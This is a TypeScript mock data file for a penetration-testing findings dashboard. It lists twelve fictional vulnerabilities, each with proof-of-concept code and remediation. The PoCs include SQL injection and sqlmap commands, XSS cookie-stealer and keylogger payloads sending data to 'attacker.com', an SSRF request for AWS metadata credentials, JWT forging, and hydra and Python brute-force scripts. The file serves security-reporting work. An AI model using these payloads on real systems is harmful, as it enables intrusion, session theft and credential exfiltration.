/**
 * Pentest Mock Data - Findings
 *
 * Mock data for penetration testing findings
 */

import type { PentestFinding } from "../../types";

// ============================================
// Mock Pentest Findings
// ============================================

export const mockPentestFindings: PentestFinding[] = [
  {
    id: "find-001",
    campaignId: "camp-001",
    title: "SQL Injection in User Search Functionality",
    description:
      "A SQL injection vulnerability was identified in the user search functionality. The 'search' parameter is directly concatenated into the SQL query without proper sanitization or parameterized queries, allowing attackers to execute arbitrary SQL commands.",
    severity: "critical",
    status: "confirmed",
    cvssScore: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cweId: "CWE-89",
    owaspCategory: "A03:2021",
    affectedAssets: ["https://app.acme.com/api/users/search"],
    stepsToReproduce: [
      "Navigate to the user search page at https://app.acme.com/users",
      "Enter the following payload in the search field: ' OR '1'='1",
      "Observe that all users are returned instead of filtered results",
      "Use sqlmap to extract database contents: sqlmap -u 'https://app.acme.com/api/users/search?q=test' --dbs",
    ],
    pocCode: `# SQL Injection PoC
import requests

url = "https://app.acme.com/api/users/search"
payload = "' UNION SELECT username, password FROM users--"

response = requests.get(url, params={"q": payload})
print(response.json())

# Output shows all usernames and password hashes`,
    pocImages: [
      {
        id: "img-001",
        type: "image",
        name: "sqli-burp-request.png",
        url: "/evidence/sqli-burp-request.png",
        description: "Burp Suite showing the SQL injection payload",
        createdAt: "2024-10-15T10:00:00Z",
      },
      {
        id: "img-002",
        type: "image",
        name: "sqli-database-dump.png",
        url: "/evidence/sqli-database-dump.png",
        description: "Database dump showing extracted user credentials",
        createdAt: "2024-10-15T10:05:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [
      {
        id: "rr-001",
        method: "GET",
        url: "https://app.acme.com/api/users/search?q=' OR '1'='1",
        requestHeaders: {
          "Host": "app.acme.com",
          "Authorization": "Bearer eyJ...",
          "Content-Type": "application/json",
        },
        responseStatus: 200,
        responseHeaders: {
          "Content-Type": "application/json",
        },
        responseBody: '{"users": [{"id": 1, "username": "admin", "email": "admin@acme.com"}, ...]}',
        notes: "All users returned due to SQL injection",
      },
    ],
    businessImpact:
      "An attacker could extract all user data including email addresses, passwords, and personal information. This could lead to account takeover, identity theft, and regulatory compliance violations (GDPR, CCPA).",
    technicalImpact:
      "Full database compromise possible. Attacker can read, modify, or delete any data in the database. Potential for remote code execution if database supports certain features.",
    remediation:
      "1. Use parameterized queries or prepared statements for all database operations\n2. Implement input validation and sanitization\n3. Apply principle of least privilege to database accounts\n4. Enable SQL injection detection in WAF",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/89.html",
    ],
    assignedTo: "tm-002",
    reviewedBy: "tm-004",
    comments: [
      {
        id: "c-001",
        authorId: "tm-001",
        authorName: "Alex Chen",
        content: "Critical finding - prioritize remediation immediately",
        createdAt: "2024-10-15T11:00:00Z",
      },
    ],
    retests: [],
    tags: ["sqli", "database", "critical", "owasp-top-10"],
    createdAt: "2024-10-15T10:00:00Z",
    updatedAt: "2024-10-16T14:00:00Z",
    createdBy: "tm-002",
  },
  {
    id: "find-002",
    campaignId: "camp-001",
    title: "Broken Access Control - IDOR in User Profile API",
    description:
      "The user profile API endpoint allows accessing other users' profiles by changing the user ID in the request. No authorization check is performed to verify if the authenticated user has permission to access the requested profile.",
    severity: "high",
    status: "remediation",
    cvssScore: 7.5,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    cweId: "CWE-639",
    owaspCategory: "A01:2021",
    affectedAssets: ["https://app.acme.com/api/users/{id}", "https://app.acme.com/api/users/{id}/settings"],
    stepsToReproduce: [
      "Login as user A (ID: 100)",
      "Access your profile: GET /api/users/100",
      "Modify the ID to access user B's profile: GET /api/users/101",
      "Observe that user B's profile data is returned without authorization error",
    ],
    pocCode: `# IDOR PoC - Enumerate user profiles
import requests

base_url = "https://app.acme.com/api/users"
headers = {"Authorization": "Bearer <user_a_token>"}

for user_id in range(1, 1000):
    response = requests.get(f"{base_url}/{user_id}", headers=headers)
    if response.status_code == 200:
        print(f"User {user_id}: {response.json()}")`,
    pocImages: [
      {
        id: "img-003",
        type: "image",
        name: "idor-different-user.png",
        url: "/evidence/idor-different-user.png",
        description: "Accessing another user's profile without authorization",
        createdAt: "2024-10-16T09:00:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [
      {
        id: "rr-002",
        method: "GET",
        url: "https://app.acme.com/api/users/101",
        requestHeaders: {
          "Host": "app.acme.com",
          "Authorization": "Bearer <user_100_token>",
        },
        responseStatus: 200,
        responseHeaders: {
          "Content-Type": "application/json",
        },
        responseBody: '{"id": 101, "username": "victim", "email": "victim@acme.com", "phone": "+1-555-0199"}',
        notes: "User 100's token accessing User 101's data",
      },
    ],
    businessImpact:
      "Attackers can access any user's personal information, potentially leading to privacy violations and regulatory fines.",
    technicalImpact:
      "Unauthorized access to user data. Could be chained with other vulnerabilities for greater impact.",
    remediation:
      "1. Implement proper authorization checks on all API endpoints\n2. Verify the authenticated user has permission to access the requested resource\n3. Use indirect object references instead of direct database IDs",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
      "https://cwe.mitre.org/data/definitions/639.html",
    ],
    assignedTo: "tm-002",
    reviewedBy: "tm-004",
    comments: [],
    retests: [],
    tags: ["idor", "access-control", "api"],
    createdAt: "2024-10-16T09:00:00Z",
    updatedAt: "2024-10-18T10:00:00Z",
    createdBy: "tm-002",
  },
  {
    id: "find-003",
    campaignId: "camp-001",
    title: "Cross-Site Scripting (XSS) in Comment Section",
    description:
      "A stored XSS vulnerability exists in the comment section. User input is not properly sanitized before being stored and rendered, allowing attackers to inject malicious JavaScript that executes in other users' browsers.",
    severity: "high",
    status: "confirmed",
    cvssScore: 6.1,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    cweId: "CWE-79",
    owaspCategory: "A03:2021",
    affectedAssets: ["https://app.acme.com/posts/{id}/comments"],
    stepsToReproduce: [
      "Navigate to any post with comments enabled",
      "Submit a comment with payload: <script>alert(document.cookie)</script>",
      "Observe that the script executes when any user views the comment",
      "Advanced payload: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>",
    ],
    pocCode: `<!-- XSS Payload Examples -->
<!-- Basic Alert -->
<script>alert('XSS')</script>

<!-- Cookie Stealer -->
<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">

<!-- Keylogger -->
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/keys?k='+e.key);
}
</script>`,
    pocImages: [
      {
        id: "img-004",
        type: "image",
        name: "xss-alert-popup.png",
        url: "/evidence/xss-alert-popup.png",
        description: "XSS alert popup showing successful script execution",
        createdAt: "2024-10-17T11:00:00Z",
      },
    ],
    pocVideos: [
      {
        id: "vid-001",
        type: "video",
        name: "xss-demonstration.mp4",
        url: "/evidence/xss-demonstration.mp4",
        description: "Video demonstrating the XSS attack flow",
        createdAt: "2024-10-17T11:30:00Z",
      },
    ],
    requestResponses: [],
    businessImpact:
      "Attackers can steal user sessions, perform actions on behalf of users, deface the website, or distribute malware to users.",
    technicalImpact:
      "Client-side code execution in victim's browser context. Can lead to session hijacking, credential theft, and phishing attacks.",
    remediation:
      "1. Implement output encoding for all user-controlled data\n2. Use Content Security Policy (CSP) headers\n3. Sanitize HTML input using a library like DOMPurify\n4. Enable HttpOnly and Secure flags on session cookies",
    references: [
      "https://owasp.org/www-community/attacks/xss/",
      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
    ],
    assignedTo: "tm-003",
    reviewedBy: "tm-004",
    comments: [],
    retests: [],
    tags: ["xss", "injection", "client-side"],
    createdAt: "2024-10-17T11:00:00Z",
    updatedAt: "2024-10-17T14:00:00Z",
    createdBy: "tm-003",
  },
  {
    id: "find-004",
    campaignId: "camp-002",
    title: "Insecure Data Storage - Sensitive Data in SharedPreferences",
    description:
      "The mobile application stores sensitive user data including authentication tokens and personal information in SharedPreferences (Android) without encryption. This data can be easily extracted from rooted devices or backups.",
    severity: "high",
    status: "confirmed",
    cvssScore: 7.1,
    cvssVector: "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    cweId: "CWE-312",
    affectedAssets: ["SecureBank Android App v3.2"],
    stepsToReproduce: [
      "Install the app on a rooted Android device",
      "Login to the application with valid credentials",
      "Access the app's data directory: /data/data/com.securebank.app/shared_prefs/",
      "Read the UserPrefs.xml file",
      "Observe plaintext authentication token and user data",
    ],
    pocCode: `# Extract SharedPreferences from rooted device
adb shell
su
cat /data/data/com.securebank.app/shared_prefs/UserPrefs.xml

# Output:
# <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
# <map>
#   <string name="auth_token">eyJhbGciOiJIUzI1NiIs...</string>
#   <string name="user_email">user@email.com</string>
#   <string name="account_number">1234567890</string>
# </map>`,
    pocImages: [
      {
        id: "img-005",
        type: "image",
        name: "sharedprefs-plaintext.png",
        url: "/evidence/sharedprefs-plaintext.png",
        description: "SharedPreferences file showing plaintext sensitive data",
        createdAt: "2024-10-20T10:00:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "User financial data and authentication credentials can be compromised from device backups or lost/stolen devices, potentially leading to financial fraud.",
    technicalImpact:
      "Sensitive data exposure including auth tokens that could be used for account takeover.",
    remediation:
      "1. Use Android Keystore for storing cryptographic keys\n2. Encrypt sensitive data using EncryptedSharedPreferences\n3. Never store sensitive data in plain text\n4. Implement certificate pinning",
    references: [
      "https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage",
      "https://developer.android.com/topic/security/data",
    ],
    assignedTo: "tm-005",
    comments: [],
    retests: [],
    tags: ["mobile", "android", "data-storage", "encryption"],
    createdAt: "2024-10-20T10:00:00Z",
    updatedAt: "2024-10-20T15:00:00Z",
    createdBy: "tm-005",
  },
  {
    id: "find-005",
    campaignId: "camp-005",
    title: "Payment Bypass via Price Manipulation",
    description:
      "The e-commerce checkout process allows manipulation of product prices on the client side. By intercepting and modifying the checkout request, an attacker can purchase items at arbitrary prices.",
    severity: "critical",
    status: "in_review",
    cvssScore: 9.1,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
    cweId: "CWE-472",
    affectedAssets: ["https://checkout.shopmax.com/api/orders", "https://checkout.shopmax.com/cart"],
    stepsToReproduce: [
      "Add an item to cart (e.g., Laptop - $999)",
      "Proceed to checkout",
      "Intercept the checkout POST request using Burp Suite",
      "Modify the 'price' parameter from 999 to 0.01",
      "Forward the modified request",
      "Observe that the order is placed with the modified price",
    ],
    pocCode: `# Price Manipulation PoC
import requests

checkout_url = "https://checkout.shopmax.com/api/orders"
headers = {
    "Authorization": "Bearer <user_token>",
    "Content-Type": "application/json"
}

# Original price: $999.00
# Modified price: $0.01
payload = {
    "items": [
        {
            "product_id": "LAPTOP-001",
            "quantity": 1,
            "price": 0.01  # Modified from 999.00
        }
    ],
    "payment_method": "credit_card",
    "card_token": "tok_test_xxx"
}

response = requests.post(checkout_url, json=payload, headers=headers)
print(response.json())  # Order placed at $0.01`,
    pocImages: [
      {
        id: "img-006",
        type: "image",
        name: "price-manipulation-burp.png",
        url: "/evidence/price-manipulation-burp.png",
        description: "Burp Suite showing modified price parameter",
        createdAt: "2024-10-18T14:00:00Z",
      },
      {
        id: "img-007",
        type: "image",
        name: "order-confirmation-1cent.png",
        url: "/evidence/order-confirmation-1cent.png",
        description: "Order confirmation showing $0.01 total",
        createdAt: "2024-10-18T14:05:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [
      {
        id: "rr-003",
        method: "POST",
        url: "https://checkout.shopmax.com/api/orders",
        requestHeaders: {
          "Content-Type": "application/json",
          "Authorization": "Bearer eyJ...",
        },
        requestBody: '{"items":[{"product_id":"LAPTOP-001","quantity":1,"price":0.01}],"payment_method":"credit_card"}',
        responseStatus: 200,
        responseHeaders: {
          "Content-Type": "application/json",
        },
        responseBody: '{"order_id":"ORD-12345","status":"confirmed","total":0.01}',
        notes: "Order placed with manipulated price of $0.01 instead of $999.00",
      },
    ],
    businessImpact:
      "Direct financial loss. Attackers can purchase any item at any price, causing significant revenue loss and potential bankruptcy.",
    technicalImpact:
      "Complete bypass of pricing logic. Database contains orders with incorrect prices.",
    remediation:
      "1. Never trust client-side price data\n2. Validate all prices server-side against database\n3. Sign or encrypt cart/order data\n4. Implement order validation before processing payment",
    references: [
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/",
      "https://cwe.mitre.org/data/definitions/472.html",
    ],
    assignedTo: "tm-001",
    reviewedBy: "tm-004",
    comments: [
      {
        id: "c-002",
        authorId: "tm-004",
        authorName: "Emily Davis",
        content: "Verified - this is a critical business logic flaw. Escalating to client immediately.",
        createdAt: "2024-10-18T16:00:00Z",
      },
    ],
    retests: [],
    tags: ["payment", "business-logic", "price-manipulation", "critical"],
    createdAt: "2024-10-18T14:00:00Z",
    updatedAt: "2024-10-19T09:00:00Z",
    createdBy: "tm-001",
  },
  {
    id: "find-006",
    campaignId: "camp-005",
    title: "Server-Side Request Forgery (SSRF) in Image Import",
    description:
      "The product image import feature allows specifying an external URL. The server fetches images from the provided URL without proper validation, enabling SSRF attacks to access internal services.",
    severity: "high",
    status: "confirmed",
    cvssScore: 8.6,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
    cweId: "CWE-918",
    owaspCategory: "A10:2021",
    affectedAssets: ["https://admin.shopmax.com/api/products/import-image"],
    stepsToReproduce: [
      "Login to admin panel",
      "Navigate to product management",
      "Use the 'Import image from URL' feature",
      "Enter internal URL: http://169.254.169.254/latest/meta-data/",
      "The server fetches AWS metadata and returns it as 'image'",
    ],
    pocCode: `# SSRF PoC - AWS Metadata Access
import requests

url = "https://admin.shopmax.com/api/products/import-image"
headers = {"Authorization": "Bearer <admin_token>"}

# Access AWS metadata
payload = {
    "product_id": "TEST-001",
    "image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

response = requests.post(url, json=payload, headers=headers)
print(response.text)  # Returns AWS credentials`,
    pocImages: [
      {
        id: "img-008",
        type: "image",
        name: "ssrf-aws-metadata.png",
        url: "/evidence/ssrf-aws-metadata.png",
        description: "AWS metadata returned via SSRF",
        createdAt: "2024-10-19T11:00:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "Attackers can access internal services, cloud metadata, and potentially pivot to internal networks. AWS credentials exposure could lead to full cloud account compromise.",
    technicalImpact:
      "Access to internal network, cloud metadata, and potentially sensitive internal services.",
    remediation:
      "1. Implement URL allowlisting for external domains\n2. Block requests to internal IP ranges and metadata endpoints\n3. Use a separate network for server-side requests\n4. Implement SSRF protections at WAF level",
    references: [
      "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
      "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
    ],
    assignedTo: "tm-003",
    comments: [],
    retests: [],
    tags: ["ssrf", "cloud", "aws", "internal-access"],
    createdAt: "2024-10-19T11:00:00Z",
    updatedAt: "2024-10-19T15:00:00Z",
    createdBy: "tm-003",
  },
  {
    id: "find-007",
    campaignId: "camp-006",
    title: "JWT Secret Key Weakness",
    description:
      "The API uses a weak, predictable JWT secret key for signing tokens. The secret 'secret123' was identified through brute-force attack, allowing attackers to forge valid JWT tokens.",
    severity: "critical",
    status: "verified",
    cvssScore: 9.8,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cweId: "CWE-347",
    affectedAssets: ["https://api.healthdata.io/v1/*"],
    stepsToReproduce: [
      "Capture a valid JWT token from authentication response",
      "Use jwt_tool or similar to brute-force the secret",
      "Run: jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt",
      "Secret found: 'secret123'",
      "Forge a new token with admin privileges",
    ],
    pocCode: `# JWT Cracking and Token Forging
import jwt
import requests

# Captured token
captured_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Cracked secret
secret = "secret123"

# Decode and verify
decoded = jwt.decode(captured_token, secret, algorithms=["HS256"])
print(f"Original claims: {decoded}")

# Forge admin token
forged_payload = {
    "sub": "admin",
    "role": "administrator",
    "exp": 9999999999
}

forged_token = jwt.encode(forged_payload, secret, algorithm="HS256")
print(f"Forged admin token: {forged_token}")

# Use forged token to access admin endpoints
response = requests.get(
    "https://api.healthdata.io/v1/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(response.json())`,
    pocImages: [
      {
        id: "img-009",
        type: "image",
        name: "jwt-cracked.png",
        url: "/evidence/jwt-cracked.png",
        description: "JWT secret cracked using jwt_tool",
        createdAt: "2024-09-25T10:00:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "Complete authentication bypass. Attackers can impersonate any user including administrators, accessing all patient health data (PHI) in violation of HIPAA.",
    technicalImpact:
      "Full authentication bypass, privilege escalation, and unauthorized access to all API endpoints.",
    remediation:
      "1. Generate a cryptographically strong random secret (min 256 bits)\n2. Store secrets in secure secret management system\n3. Implement key rotation policy\n4. Consider using asymmetric algorithms (RS256)",
    references: [
      "https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/",
      "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/",
    ],
    assignedTo: "tm-002",
    reviewedBy: "tm-004",
    comments: [],
    retests: [
      {
        id: "rt-001",
        testedBy: "tm-002",
        testedAt: "2024-10-01T10:00:00Z",
        result: "passed",
        notes: "New 512-bit secret implemented and verified. Old tokens invalidated.",
        evidence: [],
      },
    ],
    tags: ["jwt", "authentication", "cryptography", "hipaa"],
    createdAt: "2024-09-25T10:00:00Z",
    updatedAt: "2024-10-01T12:00:00Z",
    createdBy: "tm-002",
  },
  {
    id: "find-008",
    campaignId: "camp-006",
    title: "GraphQL Introspection Enabled in Production",
    description:
      "GraphQL introspection is enabled in the production environment, exposing the entire API schema including internal types, queries, mutations, and sensitive field descriptions.",
    severity: "medium",
    status: "remediation",
    cvssScore: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cweId: "CWE-200",
    affectedAssets: ["https://api.healthdata.io/graphql"],
    stepsToReproduce: [
      "Send introspection query to GraphQL endpoint",
      "Query: { __schema { types { name fields { name } } } }",
      "Receive full schema including sensitive types like AdminUser, PatientRecord, etc.",
    ],
    pocCode: `# GraphQL Introspection Query
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      description
      fields {
        name
        description
        args {
          name
          type { name }
        }
      }
    }
  }
}`,
    pocImages: [],
    pocVideos: [],
    requestResponses: [
      {
        id: "rr-004",
        method: "POST",
        url: "https://api.healthdata.io/graphql",
        requestHeaders: {
          "Content-Type": "application/json",
        },
        requestBody: '{"query":"{ __schema { types { name } } }"}',
        responseStatus: 200,
        responseHeaders: {
          "Content-Type": "application/json",
        },
        responseBody: '{"data":{"__schema":{"types":[{"name":"Query"},{"name":"PatientRecord"},{"name":"AdminMutation"}...]}}}',
      },
    ],
    businessImpact:
      "Information disclosure that aids attackers in understanding the API structure, discovering sensitive endpoints, and planning targeted attacks.",
    technicalImpact:
      "Full API schema disclosure including internal types and potentially sensitive field descriptions.",
    remediation:
      "1. Disable introspection in production environment\n2. If introspection is needed, restrict access to authenticated admins only\n3. Remove sensitive descriptions from schema",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
    ],
    assignedTo: "tm-005",
    comments: [],
    retests: [],
    tags: ["graphql", "information-disclosure", "api"],
    createdAt: "2024-09-26T09:00:00Z",
    updatedAt: "2024-09-28T11:00:00Z",
    createdBy: "tm-005",
  },
  {
    id: "find-009",
    campaignId: "camp-004",
    title: "S3 Bucket with Public Access",
    description:
      "An S3 bucket containing customer data was found to have public read access enabled. The bucket 'cloudfirst-customer-data' contains PII including names, addresses, and payment information.",
    severity: "critical",
    status: "verified",
    cvssScore: 9.1,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cweId: "CWE-284",
    affectedAssets: ["s3://cloudfirst-customer-data"],
    stepsToReproduce: [
      "List bucket contents: aws s3 ls s3://cloudfirst-customer-data --no-sign-request",
      "Download files: aws s3 cp s3://cloudfirst-customer-data/exports/ ./data --recursive --no-sign-request",
      "Observe customer PII in downloaded CSV files",
    ],
    pocCode: `# S3 Public Access PoC
aws s3 ls s3://cloudfirst-customer-data --no-sign-request

# Output:
# 2024-08-15 09:00:00     2048 customers_export_2024.csv
# 2024-08-20 10:00:00     4096 payments_2024.csv

aws s3 cp s3://cloudfirst-customer-data/customers_export_2024.csv . --no-sign-request
head customers_export_2024.csv

# Output:
# name,email,address,phone,credit_card_last4
# John Doe,john@example.com,123 Main St,555-0100,4242`,
    pocImages: [
      {
        id: "img-010",
        type: "image",
        name: "s3-public-listing.png",
        url: "/evidence/s3-public-listing.png",
        description: "S3 bucket listing without authentication",
        createdAt: "2024-08-20T14:00:00Z",
      },
    ],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "Massive data breach exposing customer PII. Potential regulatory fines (GDPR, CCPA), legal liability, and severe reputational damage.",
    technicalImpact:
      "Unauthorized public access to sensitive customer data stored in cloud storage.",
    remediation:
      "1. Immediately block public access to the bucket\n2. Enable S3 Block Public Access at account level\n3. Review and rotate any exposed credentials\n4. Implement bucket policies with explicit deny for public access\n5. Enable S3 access logging and monitoring",
    references: [
      "https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html",
    ],
    assignedTo: "tm-001",
    reviewedBy: "tm-003",
    comments: [
      {
        id: "c-003",
        authorId: "tm-003",
        authorName: "Michael Park",
        content: "Emergency fix applied. Public access blocked within 30 minutes of discovery.",
        createdAt: "2024-08-20T14:30:00Z",
      },
    ],
    retests: [
      {
        id: "rt-002",
        testedBy: "tm-001",
        testedAt: "2024-08-21T09:00:00Z",
        result: "passed",
        notes: "Public access blocked. Block Public Access enabled at account level.",
        evidence: [],
      },
    ],
    tags: ["aws", "s3", "data-breach", "cloud", "pii"],
    createdAt: "2024-08-20T14:00:00Z",
    updatedAt: "2024-08-21T10:00:00Z",
    createdBy: "tm-001",
  },
  {
    id: "find-010",
    campaignId: "camp-001",
    title: "Missing Rate Limiting on Authentication Endpoint",
    description:
      "The login endpoint lacks rate limiting, allowing unlimited authentication attempts. This enables brute-force attacks against user accounts.",
    severity: "medium",
    status: "confirmed",
    cvssScore: 5.3,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cweId: "CWE-307",
    owaspCategory: "A07:2021",
    affectedAssets: ["https://app.acme.com/api/auth/login"],
    stepsToReproduce: [
      "Use Burp Intruder or hydra to send multiple login requests",
      "Attempt 1000+ login attempts with common passwords",
      "Observe no rate limiting or account lockout",
    ],
    pocCode: `# Brute Force PoC using hydra
hydra -l admin@acme.com -P /usr/share/wordlists/rockyou.txt \\
  https-post-form "app.acme.com/api/auth/login:email=^USER^&password=^PASS^:Invalid credentials"

# Or using custom Python script
import requests
from concurrent.futures import ThreadPoolExecutor

def try_password(password):
    r = requests.post("https://app.acme.com/api/auth/login",
                     json={"email": "admin@acme.com", "password": password})
    if r.status_code == 200:
        print(f"Found: {password}")
        return True
    return False

with open("passwords.txt") as f:
    passwords = f.read().splitlines()

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_password, passwords)`,
    pocImages: [],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "User accounts can be compromised through password guessing attacks, especially for users with weak passwords.",
    technicalImpact:
      "No protection against automated authentication attacks.",
    remediation:
      "1. Implement rate limiting (e.g., 5 attempts per minute)\n2. Add CAPTCHA after failed attempts\n3. Implement account lockout policy\n4. Add exponential backoff for repeated failures",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html",
    ],
    assignedTo: "tm-002",
    comments: [],
    retests: [],
    tags: ["authentication", "brute-force", "rate-limiting"],
    createdAt: "2024-10-18T09:00:00Z",
    updatedAt: "2024-10-18T11:00:00Z",
    createdBy: "tm-002",
  },
  {
    id: "find-011",
    campaignId: "camp-010",
    title: "Default Credentials on Network Device",
    description:
      "A Cisco switch (192.168.1.10) was found using default credentials (cisco/cisco). This allows unauthorized access to network infrastructure configuration.",
    severity: "high",
    status: "remediation",
    cvssScore: 8.1,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
    cweId: "CWE-798",
    affectedAssets: ["192.168.1.10 - Cisco Catalyst 2960"],
    stepsToReproduce: [
      "Connect to switch management interface: ssh cisco@192.168.1.10",
      "Enter default password: cisco",
      "Gain full administrative access to the switch",
      "Execute: show running-config to view configuration",
    ],
    pocCode: `# Default Credential Test
$ ssh cisco@192.168.1.10
Password: cisco

Switch> enable
Password: cisco
Switch# show running-config
...
interface Vlan1
 ip address 192.168.1.10 255.255.255.0
...`,
    pocImages: [],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "Attackers can reconfigure network infrastructure, intercept traffic, or cause network outages affecting business operations.",
    technicalImpact:
      "Full administrative access to network switch. Can modify VLANs, ACLs, and routing.",
    remediation:
      "1. Immediately change default credentials\n2. Implement strong password policy for network devices\n3. Disable unused management protocols\n4. Implement network device management VLAN",
    references: [
      "https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software-releases-110/45717-ciscodefault.html",
    ],
    assignedTo: "tm-004",
    comments: [],
    retests: [],
    tags: ["network", "default-credentials", "infrastructure"],
    createdAt: "2024-10-22T10:00:00Z",
    updatedAt: "2024-10-22T12:00:00Z",
    createdBy: "tm-004",
  },
  {
    id: "find-012",
    campaignId: "camp-001",
    title: "Information Disclosure via Verbose Error Messages",
    description:
      "The application returns detailed error messages including stack traces, database queries, and internal paths when errors occur. This information aids attackers in understanding the application architecture.",
    severity: "low",
    status: "confirmed",
    cvssScore: 3.7,
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cweId: "CWE-209",
    affectedAssets: ["https://app.acme.com/*"],
    stepsToReproduce: [
      "Send malformed request to any API endpoint",
      "Example: GET /api/users/invalid-id",
      "Observe detailed error response with stack trace",
    ],
    pocCode: `# Trigger verbose error
$ curl https://app.acme.com/api/users/abc

{
  "error": "CastError",
  "message": "Cast to ObjectId failed for value \\"abc\\"",
  "stack": "CastError: Cast to ObjectId failed...\\n    at /var/www/app/node_modules/mongoose/lib/...",
  "path": "/var/www/app/src/controllers/userController.js:45"
}`,
    pocImages: [],
    pocVideos: [],
    requestResponses: [],
    businessImpact:
      "Information disclosure that helps attackers understand application internals and plan targeted attacks.",
    technicalImpact:
      "Exposure of internal paths, framework versions, and database structure.",
    remediation:
      "1. Implement generic error messages for production\n2. Log detailed errors server-side only\n3. Use error handling middleware\n4. Remove stack traces from responses",
    references: [
      "https://owasp.org/www-community/Improper_Error_Handling",
    ],
    assignedTo: "tm-003",
    comments: [],
    retests: [],
    tags: ["information-disclosure", "error-handling"],
    createdAt: "2024-10-19T09:00:00Z",
    updatedAt: "2024-10-19T10:00:00Z",
    createdBy: "tm-003",
  },
];

// ============================================
// Helper Functions
// ============================================

export function getFindings(): PentestFinding[] {
  return mockPentestFindings;
}

export function getFindingById(id: string): PentestFinding | undefined {
  return mockPentestFindings.find((finding) => finding.id === id);
}

export function getFindingsByCampaign(campaignId: string): PentestFinding[] {
  return mockPentestFindings.filter((finding) => finding.campaignId === campaignId);
}

export function getFindingsBySeverity(severity: PentestFinding["severity"]): PentestFinding[] {
  return mockPentestFindings.filter((finding) => finding.severity === severity);
}

export function getFindingsByStatus(status: PentestFinding["status"]): PentestFinding[] {
  return mockPentestFindings.filter((finding) => finding.status === status);
}

export function getFindingsStats() {
  const findings = mockPentestFindings;
  return {
    total: findings.length,
    critical: findings.filter((f) => f.severity === "critical").length,
    high: findings.filter((f) => f.severity === "high").length,
    medium: findings.filter((f) => f.severity === "medium").length,
    low: findings.filter((f) => f.severity === "low").length,
    info: findings.filter((f) => f.severity === "info").length,
    draft: findings.filter((f) => f.status === "draft").length,
    inReview: findings.filter((f) => f.status === "in_review").length,
    confirmed: findings.filter((f) => f.status === "confirmed").length,
    remediation: findings.filter((f) => f.status === "remediation").length,
    verified: findings.filter((f) => f.status === "verified").length,
  };
}
